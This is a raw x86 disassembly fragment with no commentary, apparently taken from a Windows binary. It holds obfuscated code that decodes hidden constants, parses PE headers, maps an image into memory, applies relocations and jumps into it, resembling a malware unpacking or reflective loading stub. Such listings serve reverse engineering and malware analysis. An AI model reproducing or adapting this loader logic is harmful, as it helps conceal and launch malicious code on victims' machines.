  41320b:	mov    eax,DWORD PTR [ebp+0x8]
  41320e:	mov    eax,DWORD PTR [eax+0x1c0]
  413214:	push   DWORD PTR [eax]
  413216:	push   DWORD PTR [ebp-0x30]
  413219:	push   DWORD PTR [ebp-0x20]
  41321c:	call   0x413cf2
  413221:	mov    DWORD PTR [ebp-0x2c],eax
  413224:	mov    eax,DWORD PTR [ebp-0x8]
  413227:	mov    ecx,DWORD PTR [ebp-0x20]
  41322a:	xor    eax,ebx
  41322c:	add    eax,esi
  41322e:	cmp    eax,ecx
  413230:	je     0x413251
  413232:	mov    eax,DWORD PTR [ebp+0x8]
  413235:	mov    ecx,DWORD PTR [ebp-0x48]
  413238:	mov    eax,DWORD PTR [eax+0x1d8]
  41323e:	xor    ecx,ebx
  413240:	add    ecx,esi
  413242:	push   ecx
  413243:	mov    ecx,DWORD PTR [ebp-0x8]
  413246:	xor    ecx,ebx
  413248:	add    ecx,esi
  41324a:	push   ecx
  41324b:	push   DWORD PTR [ebp-0x20]
  41324e:	call   DWORD PTR [eax+0x18]
  413251:	pop    edi
  413252:	pop    esi
  413253:	pop    ebx
  413254:	leave  
  413255:	ret    0x4
  413258:	push   ebp
  413259:	mov    ebp,esp
  41325b:	push   ecx
  41325c:	push   ecx
  41325d:	lea    eax,[ebp-0x8]
  413260:	mov    DWORD PTR [ebp-0x4],eax
  413263:	push   esi
  413264:	mov    esi,DWORD PTR [ebp-0x4]
  413267:	mov    eax,0xf881ba0f
  41326c:	mov    DWORD PTR [esi],eax
  41326e:	mov    esi,DWORD PTR [ebp-0x8]
  413271:	cmp    esi,eax
  413273:	pop    esi
  413274:	jne    0x41327e
  413276:	mov    BYTE PTR [ecx+0xa],0x7a
  41327a:	mov    BYTE PTR [edx+0x8],0x2f
  41327e:	mov    BYTE PTR [edx+0xa],0x7a
  413282:	mov    BYTE PTR [ecx+0x2],0x8
  413286:	leave  
  413287:	ret    
  413288:	push   ebp
  413289:	mov    ebp,esp
  41328b:	push   ecx
  41328c:	push   ecx
  41328d:	lea    eax,[ebp-0x8]
  413290:	mov    DWORD PTR [ebp-0x4],eax
  413293:	mov    edx,DWORD PTR [ebp-0x4]
  413296:	mov    eax,0xf88b0beb
  41329b:	mov    DWORD PTR [edx],eax
  41329d:	mov    edx,DWORD PTR [ebp-0x8]
  4132a0:	cmp    edx,eax
  4132a2:	jne    0x4132b3
  4132a4:	mov    eax,DWORD PTR [ebp+0x8]
  4132a7:	mov    BYTE PTR [ecx+0x9],0xe
  4132ab:	mov    BYTE PTR [eax+0x7],0x47
  4132af:	mov    BYTE PTR [ecx+0x6],0xf
  4132b3:	mov    BYTE PTR [ecx+0x3],0x1e
  4132b7:	leave  
  4132b8:	ret    0x4
  4132bb:	push   ebp
  4132bc:	mov    ebp,esp
  4132be:	push   ecx
  4132bf:	push   ecx
  4132c0:	lea    eax,[ebp-0x8]
  4132c3:	mov    DWORD PTR [ebp-0x4],eax
  4132c6:	mov    edx,DWORD PTR [ebp-0x4]
  4132c9:	mov    eax,0x7e0da0f
  4132ce:	mov    DWORD PTR [edx],eax
  4132d0:	mov    edx,DWORD PTR [ebp-0x8]
  4132d3:	cmp    edx,eax
  4132d5:	jne    0x4132db
  4132d7:	mov    BYTE PTR [ecx+0x7],0x47
  4132db:	mov    eax,DWORD PTR [ebp+0x8]
  4132de:	mov    BYTE PTR [ecx+0x1],0x5
  4132e2:	mov    BYTE PTR [eax+0x9],0x2e
  4132e6:	leave  
  4132e7:	ret    0x4
  4132ea:	push   ebp
  4132eb:	mov    ebp,esp
  4132ed:	push   ecx
  4132ee:	push   ecx
  4132ef:	lea    eax,[ebp-0x8]
  4132f2:	mov    DWORD PTR [ebp-0x4],eax
  4132f5:	push   esi
  4132f6:	mov    esi,DWORD PTR [ebp-0x4]
  4132f9:	mov    eax,0x7060e3c
  4132fe:	mov    DWORD PTR [esi],eax
  413300:	mov    esi,DWORD PTR [ebp-0x8]
  413303:	cmp    esi,eax
  413305:	pop    esi
  413306:	jne    0x413312
  413308:	mov    BYTE PTR [edx+0x4],0xb
  41330c:	mov    WORD PTR [ecx+0x3],0xb1e
  413312:	mov    BYTE PTR [edx],0x3f
  413315:	leave  
  413316:	ret    
  413317:	push   ebp
  413318:	mov    ebp,esp
  41331a:	push   ecx
  41331b:	push   ecx
  41331c:	lea    eax,[ebp-0x8]
  41331f:	mov    DWORD PTR [ebp-0x4],eax
  413322:	mov    edx,DWORD PTR [ebp-0x4]
  413325:	mov    eax,0xf8870b3f
  41332a:	mov    DWORD PTR [edx],eax
  41332c:	mov    edx,DWORD PTR [ebp-0x8]
  41332f:	cmp    edx,eax
  413331:	jne    0x41333e
  413333:	mov    eax,DWORD PTR [ebp+0x8]
  413336:	mov    BYTE PTR [ecx+0x8],0xf
  41333a:	mov    BYTE PTR [eax+0x1],0x5
  41333e:	mov    BYTE PTR [ecx+0x5],0xf3
  413342:	leave  
  413343:	ret    0x4
  413346:	push   esi
  413347:	mov    ecx,edi
  413349:	call   0x413317
  41334e:	mov    edx,edi
  413350:	mov    ecx,esi
  413352:	mov    BYTE PTR [esi],0x1f
  413355:	call   0x4132ea
  41335a:	push   esi
  41335b:	mov    ecx,edi
  41335d:	mov    BYTE PTR [esi+0x5],0xf3
  413361:	call   0x4132bb
  413366:	push   esi
  413367:	mov    BYTE PTR [esi+0x6],0xf
  41336b:	call   0x413288
  413370:	mov    BYTE PTR [esi+0x2],0x8
  413374:	mov    edx,esi
  413376:	jmp    0x413258
  41337b:	push   ebp
  41337c:	mov    ebp,esp
  41337e:	push   ecx
  41337f:	mov    ecx,DWORD PTR [edx+0x194]
  413385:	push   esi
  413386:	mov    esi,DWORD PTR [ebp+0x8]
  413389:	mov    esi,DWORD PTR [esi]
  41338b:	mov    DWORD PTR [ecx],esi
  41338d:	mov    ecx,DWORD PTR [edx+0x194]
  413393:	mov    ecx,DWORD PTR [ecx]
  413395:	mov    esi,DWORD PTR [edx+0x190]
  41339b:	mov    DWORD PTR [esi],ecx
  41339d:	mov    eax,DWORD PTR [edx+0x194]
  4133a3:	mov    ecx,DWORD PTR [eax]
  4133a5:	mov    ecx,DWORD PTR [ecx+0x3c]
  4133a8:	add    ecx,DWORD PTR [eax]
  4133aa:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  4133b1:	mov    eax,DWORD PTR [ebp-0x4]
  4133b4:	movzx  ecx,WORD PTR [ecx+0x16]
  4133b8:	xor    eax,0x7510896
  4133bd:	add    eax,0x3272dd
  4133c2:	pop    esi
  4133c3:	test   ecx,eax
  4133c5:	je     0x4133d3
  4133c7:	mov    eax,DWORD PTR [edx+0x1c8]
  4133cd:	mov    DWORD PTR [eax],0xf89c85b2
  4133d3:	leave  
  4133d4:	ret    0x4
  4133d7:	push   ebp
  4133d8:	mov    ebp,esp
  4133da:	sub    esp,0x70
  4133dd:	and    DWORD PTR [ebp-0x20],0x0
  4133e1:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  4133e8:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4133ef:	mov    DWORD PTR [ebp-0x2c],0xf89c85b1
  4133f6:	mov    DWORD PTR [ebp-0x14],0xf89c85b3
  4133fd:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  413404:	mov    eax,DWORD PTR [ebp+0x20]
  413407:	mov    eax,DWORD PTR [eax+0x194]
  41340d:	mov    DWORD PTR [ebp-0xc],eax
  413410:	mov    eax,DWORD PTR [ebp+0x20]
  413413:	push   ebx
  413414:	push   esi
  413415:	mov    esi,DWORD PTR [eax+0x190]
  41341b:	mov    eax,DWORD PTR [ebp+0x20]
  41341e:	mov    eax,DWORD PTR [eax+0x18c]
  413424:	mov    DWORD PTR [ebp-0x8],eax
  413427:	mov    eax,DWORD PTR [eax]
  413429:	push   edi
  41342a:	mov    DWORD PTR [ebp-0x4],esi
  41342d:	test   eax,eax
  41342f:	jne    0x41343c
  413431:	push   DWORD PTR [ebp+0x1c]
  413434:	mov    edx,DWORD PTR [ebp+0x20]
  413437:	call   0x41337b
  41343c:	mov    eax,DWORD PTR [esi]
  41343e:	mov    ebx,DWORD PTR [esi]
  413440:	add    ebx,DWORD PTR [eax+0x3c]
  413443:	mov    eax,DWORD PTR [ebp+0xc]
  413446:	mov    ecx,DWORD PTR [ebp-0x8]
  413449:	mov    ecx,DWORD PTR [ecx]
  41344b:	mov    esi,0x7510896
  413450:	xor    eax,esi
  413452:	mov    edi,0x3272dd
  413457:	add    eax,edi
  413459:	cmp    eax,ecx
  41345b:	jne    0x413693
  413461:	mov    eax,DWORD PTR [ebp-0xc]
  413464:	mov    eax,DWORD PTR [eax]
  413466:	mov    DWORD PTR [ebp-0x10],eax
  413469:	mov    eax,DWORD PTR [ebx+0x50]
  41346c:	mov    DWORD PTR [ebp-0x68],eax
  41346f:	mov    eax,DWORD PTR [ebp-0x18]
  413472:	xor    eax,esi
  413474:	add    eax,edi
  413476:	mov    DWORD PTR [ebp-0x64],eax
  413479:	mov    eax,DWORD PTR [ebp-0x14]
  41347c:	and    DWORD PTR [ebp-0x6c],0x0
  413480:	xor    eax,esi
  413482:	add    eax,edi
  413484:	mov    DWORD PTR [ebp-0x60],eax
  413487:	lea    eax,[ebp-0x70]
  41348a:	push   eax
  41348b:	mov    eax,DWORD PTR [ebp+0x8]
  41348e:	xor    eax,esi
  413490:	add    eax,edi
  413492:	push   eax
  413493:	mov    eax,DWORD PTR [ebp+0x20]
  413496:	add    eax,0xaa
  41349b:	push   eax
  41349c:	mov    eax,DWORD PTR [ebp+0x20]
  41349f:	mov    eax,DWORD PTR [eax+0x198]
  4134a5:	mov    DWORD PTR [ebp-0x70],0x4
  4134ac:	push   DWORD PTR [eax]
  4134ae:	mov    eax,DWORD PTR [ebp+0x10]
  4134b1:	call   eax
  4134b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4134b6:	mov    ecx,DWORD PTR [ecx]
  4134b8:	mov    edx,DWORD PTR [ebp-0x8]
  4134bb:	mov    DWORD PTR [ebp-0x6c],eax
  4134be:	mov    DWORD PTR [ebp+0x1c],eax
  4134c1:	mov    DWORD PTR [edx],ecx
  4134c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4134c6:	mov    DWORD PTR [ecx],eax
  4134c8:	mov    eax,DWORD PTR [ebx+0x50]
  4134cb:	mov    DWORD PTR [ebp-0x68],eax
  4134ce:	mov    eax,DWORD PTR [ebp-0x1c]
  4134d1:	xor    eax,esi
  4134d3:	add    eax,edi
  4134d5:	mov    DWORD PTR [ebp-0x64],eax
  4134d8:	lea    eax,[ebp-0x20]
  4134db:	mov    DWORD PTR [ebp-0x60],eax
  4134de:	lea    eax,[ebp-0x70]
  4134e1:	push   eax
  4134e2:	mov    eax,DWORD PTR [ebp+0x8]
  4134e5:	xor    eax,esi
  4134e7:	add    eax,edi
  4134e9:	push   eax
  4134ea:	mov    eax,DWORD PTR [ebp+0x20]
  4134ed:	add    eax,0xee
  4134f2:	push   eax
  4134f3:	mov    eax,DWORD PTR [ebp+0x20]
  4134f6:	mov    eax,DWORD PTR [eax+0x198]
  4134fc:	mov    DWORD PTR [ebp-0x70],0x4
  413503:	push   DWORD PTR [eax]
  413505:	mov    eax,DWORD PTR [ebp+0x10]
  413508:	call   eax
  41350a:	test   eax,eax
  41350c:	je     0x413531
  41350e:	and    DWORD PTR [ebp+0xc],0x0
  413512:	cmp    DWORD PTR [ebx+0x50],0x0
  413516:	jbe    0x413531
  413518:	mov    eax,DWORD PTR [ebp+0x1c]
  41351b:	mov    ecx,DWORD PTR [ebp-0x10]
  41351e:	sub    ecx,eax
  413520:	mov    dl,BYTE PTR [ecx+eax*1]
  413523:	inc    DWORD PTR [ebp+0xc]
  413526:	mov    BYTE PTR [eax],dl
  413528:	mov    edx,DWORD PTR [ebp+0xc]
  41352b:	inc    eax
  41352c:	cmp    edx,DWORD PTR [ebx+0x50]
  41352f:	jb     0x413520
  413531:	mov    edx,DWORD PTR [ebp+0x1c]
  413534:	mov    ecx,DWORD PTR [edx+0x3c]
  413537:	add    ecx,edx
  413539:	mov    eax,DWORD PTR [ecx+0xa0]
  41353f:	mov    ebx,DWORD PTR [ecx+0x28]
  413542:	add    eax,edx
  413544:	sub    edx,DWORD PTR [ebp-0x10]
  413547:	add    ebx,DWORD PTR [ebp+0x1c]
  41354a:	mov    DWORD PTR [ebp+0xc],edx
  41354d:	mov    DWORD PTR [ebp-0x2c],ecx
  413550:	mov    DWORD PTR [ebp-0x14],ebx
  413553:	mov    DWORD PTR [ebp-0x8],0x0
  41355a:	jmp    0x4135d6
  41355c:	add    edx,0xfffffff8
  41355f:	shr    edx,1
  413561:	mov    DWORD PTR [ebp-0x18],edx
  413564:	je     0x4135c2
  413566:	lea    edx,[eax+0x8]
  413569:	mov    DWORD PTR [ebp-0x4],edx
  41356c:	mov    edx,DWORD PTR [ebp-0x18]
  41356f:	mov    DWORD PTR [ebp-0x18],edx
  413572:	mov    edx,DWORD PTR [ebp-0x4]
  413575:	movzx  edx,WORD PTR [edx]
  413578:	mov    DWORD PTR [ebp-0x24],edx
  41357b:	and    edx,0xfff
  413581:	mov    DWORD PTR [ebp-0x28],edx
  413584:	mov    edx,DWORD PTR [ebp-0x24]
  413587:	shr    edx,0xc
  41358a:	add    edx,0xffcd8d23
  413590:	xor    edx,esi
  413592:	cmp    edx,0xf89c85b0
  413598:	jne    0x4135b9
  41359a:	mov    edx,DWORD PTR [ebp-0x28]
  41359d:	add    edx,DWORD PTR [ebp+0x1c]
  4135a0:	mov    ebx,DWORD PTR [eax]
  4135a2:	cmp    DWORD PTR [ebx+edx*1],0x0
  4135a6:	je     0x4135b6
  4135a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4135ab:	add    ecx,DWORD PTR [ebx+edx*1]
  4135ae:	mov    ebx,DWORD PTR [eax]
  4135b0:	mov    DWORD PTR [edx+ebx*1],ecx
  4135b3:	mov    ecx,DWORD PTR [ebp-0x2c]
  4135b6:	mov    ebx,DWORD PTR [ebp-0x14]
  4135b9:	add    DWORD PTR [ebp-0x4],0x2
  4135bd:	dec    DWORD PTR [ebp-0x18]
  4135c0:	jne    0x413572
  4135c2:	mov    edx,DWORD PTR [ebp-0xc]
  4135c5:	add    DWORD PTR [ebp-0x8],edx
  4135c8:	mov    edx,DWORD PTR [ebp-0x8]
  4135cb:	cmp    edx,DWORD PTR [ecx+0xa4]
  4135d1:	jae    0x4135e4
  4135d3:	add    eax,DWORD PTR [ebp-0xc]
  4135d6:	mov    edx,DWORD PTR [eax+0x4]
  4135d9:	mov    DWORD PTR [ebp-0xc],edx
  4135dc:	test   edx,edx
  4135de:	jne    0x41355c
  4135e4:	mov    eax,DWORD PTR [ebp-0x10]
  4135e7:	mov    DWORD PTR [ebp-0x6c],eax
  4135ea:	mov    DWORD PTR [ebp-0x70],0x4
  4135f1:	mov    eax,DWORD PTR [ecx+0x50]
  4135f4:	mov    DWORD PTR [ebp-0x68],eax
  4135f7:	mov    eax,DWORD PTR [ebp-0x1c]
  4135fa:	xor    eax,esi
  4135fc:	add    eax,edi
  4135fe:	mov    DWORD PTR [ebp-0x64],eax
  413601:	lea    eax,[ebp-0x20]
  413604:	mov    DWORD PTR [ebp-0x60],eax
  413607:	lea    eax,[ebp-0x70]
  41360a:	push   eax
  41360b:	mov    eax,DWORD PTR [ebp+0x8]
  41360e:	xor    eax,esi
  413610:	add    eax,edi
  413612:	push   eax
  413613:	mov    eax,DWORD PTR [ebp+0x20]
  413616:	add    eax,0xee
  41361b:	push   eax
  41361c:	mov    eax,DWORD PTR [ebp+0x20]
  41361f:	mov    eax,DWORD PTR [eax+0x198]
  413625:	push   DWORD PTR [eax]
  413627:	mov    eax,DWORD PTR [ebp+0x10]
  41362a:	call   eax
  41362c:	mov    eax,DWORD PTR [ebp+0x20]
  41362f:	mov    eax,DWORD PTR [eax+0x180]
  413635:	add    eax,DWORD PTR [ebp+0xc]
  413638:	mov    ecx,DWORD PTR [ebp+0xc]
  41363b:	push   DWORD PTR [ebp+0x18]
  41363e:	mov    DWORD PTR [eax],ecx
  413640:	push   DWORD PTR [ebp+0x14]
  413643:	push   DWORD PTR [ebp+0x1c]
  413646:	call   ebx
  413648:	mov    eax,DWORD PTR [ebp+0xc]
  41364b:	add    eax,DWORD PTR [ebp+0x20]
  41364e:	lea    ecx,[ebp+0x4]
  413651:	mov    DWORD PTR [ebp+0x20],eax
  413654:	mov    eax,DWORD PTR [ebp+0x20]
  413657:	mov    eax,DWORD PTR [ebp+0x20]
  41365a:	mov    edx,DWORD PTR [eax+0x190]
  413660:	mov    eax,DWORD PTR [ebp+0x20]
  413663:	mov    eax,DWORD PTR [eax+0x18c]
  413669:	mov    esi,DWORD PTR [eax]
  41366b:	cmp    DWORD PTR [ecx],esi
  41366d:	jb     0x41368e
  41366f:	mov    esi,DWORD PTR [edx]
  413671:	mov    edi,DWORD PTR [edx]
  413673:	mov    esi,DWORD PTR [esi+0x3c]
  413676:	lea    esi,[edi+esi*1+0x50]
  41367a:	mov    edi,DWORD PTR [eax]
  41367c:	add    edi,DWORD PTR [esi]
  41367e:	cmp    DWORD PTR [ecx],edi
  413680:	jae    0x41368e
  413682:	mov    esi,DWORD PTR [eax]
  413684:	mov    eax,DWORD PTR [ecx]
  413686:	mov    edx,DWORD PTR [edx]
  413688:	sub    eax,esi
  41368a:	add    edx,eax
  41368c:	mov    DWORD PTR [ecx],edx
  41368e:	mov    eax,DWORD PTR [ebp+0xc]
  413691:	jmp    0x4136d4
  413693:	push   DWORD PTR [ebp+0x20]
  413696:	call   0x412804
  41369b:	mov    eax,DWORD PTR [ebp+0x20]
  41369e:	mov    eax,DWORD PTR [eax+0x1c8]
  4136a4:	mov    eax,DWORD PTR [eax]
  4136a6:	xor    eax,esi
  4136a8:	add    eax,edi
  4136aa:	mov    eax,DWORD PTR [ebp+0x20]
  4136ad:	jne    0x4136c5
  4136af:	mov    ecx,DWORD PTR [ebp+0x20]
  4136b2:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4136b8:	push   DWORD PTR [ecx]
  4136ba:	mov    eax,DWORD PTR [eax+0x1d8]
  4136c0:	call   DWORD PTR [eax+0x28]
  4136c3:	jmp    0x4136d2
  4136c5:	mov    eax,DWORD PTR [eax+0x17c]
  4136cb:	mov    ecx,DWORD PTR [eax]
  4136cd:	lea    eax,[ebp+0x4]
  4136d0:	add    DWORD PTR [eax],ecx
  4136d2:	xor    eax,eax
  4136d4:	pop    edi
  4136d5:	pop    esi
  4136d6:	pop    ebx
  4136d7:	leave  
  4136d8:	ret    0x1c
  4136db:	push   ebp
  4136dc:	mov    ebp,esp
  4136de:	sub    esp,0x1c
  4136e1:	push   esi
  4136e2:	mov    esi,eax
  4136e4:	mov    eax,DWORD PTR [ecx+0x190]
  4136ea:	cmp    DWORD PTR [eax],0x0
  4136ed:	je     0x4137fd
  4136f3:	test   edx,edx
  4136f5:	je     0x4137fd
  4136fb:	test   esi,esi
  4136fd:	je     0x4137fd
  413703:	mov    eax,DWORD PTR [esi+0x88]
  413709:	test   eax,eax
  41370b:	je     0x4137f8
  413711:	cmp    DWORD PTR [esi+0x8c],0x10
  413718:	je     0x4137f8
  41371e:	cmp    DWORD PTR [esi+0x34],edx
  413721:	je     0x4137f8
  413727:	mov    esi,DWORD PTR [ecx+0x18c]
  41372d:	and    DWORD PTR [ebp-0x10],0x0
  413731:	mov    ecx,edx
  413733:	sub    ecx,DWORD PTR [esi]
  413735:	add    eax,edx
  413737:	movzx  edx,WORD PTR [eax+0xc]
  41373b:	mov    DWORD PTR [ebp-0x1c],ecx
  41373e:	movzx  ecx,WORD PTR [eax+0xe]
  413742:	add    ecx,edx
  413744:	je     0x4137f8
  41374a:	lea    ecx,[eax+0x14]
  41374d:	push   ebx
  41374e:	mov    DWORD PTR [ebp-0x18],ecx
  413751:	mov    esi,0x7fffffff
  413756:	push   edi
  413757:	test   DWORD PTR [ecx],esi
  413759:	je     0x4137da
  41375b:	mov    edx,DWORD PTR [ecx]
  41375d:	and    DWORD PTR [ebp-0xc],0x0
  413761:	and    edx,esi
  413763:	add    edx,eax
  413765:	movzx  edi,WORD PTR [edx+0xe]
  413769:	movzx  ebx,WORD PTR [edx+0xc]
  41376d:	add    edi,ebx
  41376f:	je     0x4137da
  413771:	lea    ecx,[edx+0x14]
  413774:	mov    DWORD PTR [ebp-0x14],ecx
  413777:	test   DWORD PTR [ecx],esi
  413779:	je     0x4137bc
  41377b:	mov    ecx,DWORD PTR [ecx]
  41377d:	and    DWORD PTR [ebp-0x8],0x0
  413781:	and    ecx,esi
  413783:	add    ecx,eax
  413785:	movzx  edi,WORD PTR [ecx+0xe]
  413789:	movzx  ebx,WORD PTR [ecx+0xc]
  41378d:	add    edi,ebx
  41378f:	je     0x4137bc
  413791:	lea    edi,[ecx+0x14]
  413794:	mov    DWORD PTR [ebp-0x4],edi
  413797:	mov    edi,DWORD PTR [ebp-0x4]
  41379a:	mov    edi,DWORD PTR [edi]
  41379c:	test   edi,edi
  41379e:	je     0x4137a6
  4137a0:	mov    ebx,DWORD PTR [ebp-0x1c]
  4137a3:	add    DWORD PTR [edi+eax*1],ebx
  4137a6:	movzx  edi,WORD PTR [ecx+0xe]
  4137aa:	movzx  ebx,WORD PTR [ecx+0xc]
  4137ae:	inc    DWORD PTR [ebp-0x8]
  4137b1:	add    DWORD PTR [ebp-0x4],0x8
  4137b5:	add    edi,ebx
  4137b7:	cmp    DWORD PTR [ebp-0x8],edi
  4137ba:	jb     0x413797
  4137bc:	movzx  edi,WORD PTR [edx+0xe]
  4137c0:	movzx  ebx,WORD PTR [edx+0xc]
  4137c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4137c7:	inc    DWORD PTR [ebp-0xc]
  4137ca:	add    ecx,0x8
  4137cd:	add    edi,ebx
  4137cf:	mov    DWORD PTR [ebp-0x14],ecx
  4137d2:	cmp    DWORD PTR [ebp-0xc],edi
  4137d5:	jb     0x413777
  4137d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4137da:	movzx  edx,WORD PTR [eax+0xe]
  4137de:	movzx  edi,WORD PTR [eax+0xc]
  4137e2:	inc    DWORD PTR [ebp-0x10]
  4137e5:	add    ecx,0x8
  4137e8:	add    edx,edi
  4137ea:	mov    DWORD PTR [ebp-0x18],ecx
  4137ed:	cmp    DWORD PTR [ebp-0x10],edx
  4137f0:	jb     0x413757
  4137f6:	pop    edi
  4137f7:	pop    ebx
  4137f8:	xor    eax,eax
  4137fa:	inc    eax
  4137fb:	jmp    0x4137ff
  4137fd:	xor    eax,eax
  4137ff:	pop    esi
  413800:	leave  
  413801:	ret    
  413802:	push   ebp
  413803:	mov    ebp,esp
  413805:	mov    ecx,DWORD PTR [ecx+0x190]
  41380b:	mov    eax,DWORD PTR [ebp+0xc]
  41380e:	sub    esp,0x10
  413811:	push   ebx
  413812:	xor    ebx,ebx
  413814:	push   esi
  413815:	push   edi
  413816:	cmp    DWORD PTR [ecx],ebx
  413818:	je     0x4138a0
  41381e:	cmp    eax,ebx
  413820:	je     0x4138a0
  413822:	cmp    DWORD PTR [eax+0x78],ebx
  413825:	jne    0x41382c
  413827:	xor    eax,eax
  413829:	inc    eax
  41382a:	jmp    0x4138a2
  41382c:	mov    eax,DWORD PTR [eax+0x78]
  41382f:	add    eax,DWORD PTR [ebp+0x8]
  413832:	mov    ecx,DWORD PTR [eax+0x1c]
  413835:	mov    edx,DWORD PTR [eax+0x24]
  413838:	mov    esi,DWORD PTR [eax+0x14]
  41383b:	mov    edi,DWORD PTR [eax+0x18]
  41383e:	add    ecx,DWORD PTR [ebp+0x8]
  413841:	add    edx,DWORD PTR [ebp+0x8]
  413844:	mov    DWORD PTR [ebp-0x4],esi
  413847:	cmp    esi,edi
  413849:	ja     0x41384e
  41384b:	mov    DWORD PTR [ebp-0x4],edi
  41384e:	mov    DWORD PTR [ebp-0x8],ebx
  413851:	cmp    DWORD PTR [ebp-0x4],ebx
  413854:	jbe    0x413827
  413856:	cmp    ebx,DWORD PTR [eax+0x14]
  413859:	jae    0x413861
  41385b:	movzx  esi,WORD PTR [edx+ebx*2]
  41385f:	jmp    0x413863
  413861:	mov    esi,ebx
  413863:	lea    esi,[ecx+esi*4]
  413866:	mov    edi,DWORD PTR [esi]
  413868:	test   edi,edi
  41386a:	je     0x413895
  41386c:	add    edi,DWORD PTR [ebp+0x8]
  41386f:	mov    DWORD PTR [ebp-0x10],edi
  413872:	cmp    edi,eax
  413874:	jbe    0x413886
  413876:	mov    ebx,DWORD PTR [ebp+0xc]
  413879:	mov    ebx,DWORD PTR [ebx+0x7c]
  41387c:	add    ebx,eax
  41387e:	cmp    edi,ebx
  413880:	jae    0x413886
  413882:	mov    esi,DWORD PTR [esi]
  413884:	jmp    0x41388e
  413886:	sub    edi,DWORD PTR [ebp+0x8]
  413889:	mov    DWORD PTR [esi],edi
  41388b:	mov    esi,DWORD PTR [ebp-0x10]
  41388e:	test   esi,esi
  413890:	je     0x4138a0
  413892:	mov    ebx,DWORD PTR [ebp-0x8]
  413895:	inc    ebx
  413896:	mov    DWORD PTR [ebp-0x8],ebx
  413899:	cmp    ebx,DWORD PTR [ebp-0x4]
  41389c:	jb     0x413856
  41389e:	jmp    0x413827
  4138a0:	xor    eax,eax
  4138a2:	pop    edi
  4138a3:	pop    esi
  4138a4:	pop    ebx
  4138a5:	leave  
  4138a6:	ret    0x8
  4138a9:	push   ebp
  4138aa:	mov    ebp,esp
  4138ac:	sub    esp,0x2c
  4138af:	mov    edx,0xf89c85b5
  4138b4:	mov    DWORD PTR [ebp-0x4],edx
  4138b7:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4138be:	mov    eax,DWORD PTR [ebp-0x4]
  4138c1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4138ca:	mov    ecx,DWORD PTR [ebp-0x4]
  4138cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4138d0:	push   ebx
  4138d1:	mov    ebx,DWORD PTR [ebp+0x10]
  4138d4:	push   esi
  4138d5:	mov    esi,0x7510896
  4138da:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4138e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138e4:	mov    ebx,DWORD PTR [ebx+0x190]
  4138ea:	push   edi
  4138eb:	mov    edi,0x3272dd
  4138f0:	xor    ecx,esi
  4138f2:	xor    eax,esi
  4138f4:	add    eax,edi
  4138f6:	add    ecx,edi
  4138f8:	mov    DWORD PTR [ebp-0x18],eax
  4138fb:	cmp    ecx,DWORD PTR [ebx]
  4138fd:	je     0x413b7e
  413903:	mov    ebx,DWORD PTR [ebp-0x4]
  413906:	mov    ecx,DWORD PTR [ebp+0xc]
  413909:	xor    ebx,esi
  41390b:	add    ebx,edi
  41390d:	cmp    ebx,ecx
  41390f:	je     0x413b7e
  413915:	mov    ebx,DWORD PTR [ebp-0x4]
  413918:	mov    ecx,DWORD PTR [ecx+0x80]
  41391e:	xor    ebx,esi
  413920:	add    ebx,edi
  413922:	cmp    ecx,ebx
  413924:	je     0x413b79
  41392a:	add    ecx,DWORD PTR [ebp+0x8]
  41392d:	mov    DWORD PTR [ebp-0x2c],ecx
  413930:	mov    ebx,edx
  413932:	xor    ebx,esi
  413934:	add    ebx,edi
  413936:	mov    DWORD PTR [ebp-0x10],ebx
  413939:	mov    ebx,DWORD PTR [ebp-0x10]
  41393c:	cmp    ebx,edx
  41393e:	je     0x413952
  413940:	mov    edx,DWORD PTR [ebp-0x10]
  413943:	mov    ebx,DWORD PTR [ebp-0x4]
  413946:	imul   edx,edx,0x14
  413949:	xor    ebx,esi
  41394b:	add    ebx,edi
  41394d:	cmp    DWORD PTR [edx+ecx*1],ebx
  413950:	jne    0x413969
  413952:	mov    edx,DWORD PTR [ebp-0x10]
  413955:	mov    ebx,DWORD PTR [ebp-0x4]
  413958:	imul   edx,edx,0x14
  41395b:	xor    ebx,esi
  41395d:	add    ebx,edi
  41395f:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  413963:	je     0x413b6b
  413969:	mov    eax,DWORD PTR [ebp-0x4]
  41396c:	mov    ebx,DWORD PTR [ebp-0x4]
  41396f:	mov    eax,DWORD PTR [ebp-0x10]
  413972:	imul   eax,eax,0x14
  413975:	add    eax,ecx
  413977:	mov    ecx,DWORD PTR [eax+0x10]
  41397a:	add    ecx,DWORD PTR [ebp+0x8]
  41397d:	xor    ebx,esi
  41397f:	mov    DWORD PTR [ebp-0x1c],ecx
  413982:	mov    ecx,DWORD PTR [ebp-0x4]
  413985:	mov    edx,DWORD PTR [ebp-0x4]
  413988:	xor    ecx,esi
  41398a:	add    ecx,edi
  41398c:	xor    edx,esi
  41398e:	mov    DWORD PTR [ebp-0x24],ecx
  413991:	mov    ecx,DWORD PTR [eax]
  413993:	add    edx,edi
  413995:	add    ebx,edi
  413997:	cmp    ecx,edx
  413999:	je     0x4139a1
  41399b:	add    ecx,DWORD PTR [ebp+0x8]
  41399e:	mov    DWORD PTR [ebp-0x24],ecx
  4139a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4139a4:	xor    ecx,esi
  4139a6:	add    ecx,DWORD PTR [eax+0xc]
  4139a9:	mov    eax,DWORD PTR [ebp+0x8]
  4139ac:	lea    eax,[ecx+eax*1+0x3272dd]
  4139b3:	mov    DWORD PTR [ebp+0xc],eax
  4139b6:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4139bd:	mov    eax,DWORD PTR [ebp+0x10]
  4139c0:	push   DWORD PTR [ebp+0xc]
  4139c3:	mov    eax,DWORD PTR [eax+0x1d8]
